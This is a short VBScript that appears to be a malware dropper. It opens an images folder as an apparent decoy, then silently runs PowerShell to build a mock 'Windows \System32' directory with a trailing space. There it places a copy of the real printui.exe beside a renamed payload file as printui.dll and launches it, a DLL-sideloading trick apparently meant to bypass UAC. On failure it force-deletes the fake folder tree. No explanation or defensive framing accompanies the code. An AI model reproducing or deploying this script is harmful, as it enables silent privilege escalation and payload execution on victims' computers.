Dim objShell, objFSO, strSystemDrive
Set objFSO = CreateObject("Scripting.FileSystemObject")
strSystemDrive = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%SystemDrive%")

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("explorer ..\images")

If Not objFSO.FolderExists(strSystemDrive & "\Windows \System32\010101") Then
	If objFSO.FolderExists(strSystemDrive & "\Windows \System32") Then
		objShell.Run "powershell Remove-Item -Path '\\?\" & strSystemDrive & "\Windows \' -Recurse -Force", 0, True
	End If

	objShell.Run "powershell mkdir '\\?\" & strSystemDrive & "\Windows \System32'; Start-Sleep -Seconds 1; mkdir '" & strSystemDrive & "\Windows \System32\010101'; Copy-Item '" & strSystemDrive & "\Windows\System32\printui.exe' '" & strSystemDrive & "\Windows \System32\printui.exe' -Force; Start-Sleep -Seconds 1; Copy-Item 'x219475.dat' '" & strSystemDrive & "\Windows \System32\printui.dll' -Force; Start-Sleep -Seconds 5;", 0, True

	If objFSO.FileExists(strSystemDrive & "\Windows \System32\printui.exe") Then
		If objFSO.FileExists(strSystemDrive & "\Windows \System32\printui.dll") Then
			objShell.Run "powershell mkdir '" & strSystemDrive & "\Windows \System32\shrd_b_'; Start-Sleep -Seconds 3; Start-Process -FilePath '" & strSystemDrive &"\Windows \System32\printui.exe';", 0, True
		Else
			objShell.Run "powershell Remove-Item -Path '\\?\" & strSystemDrive & "\Windows \' -Recurse -Force", 0, True
		End If
	Else
		objShell.Run "powershell Remove-Item -Path '\\?\" & strSystemDrive & "\Windows \' -Recurse -Force", 0, True
	End If
End If

Set objShell = Nothing
Set objFSO = Nothing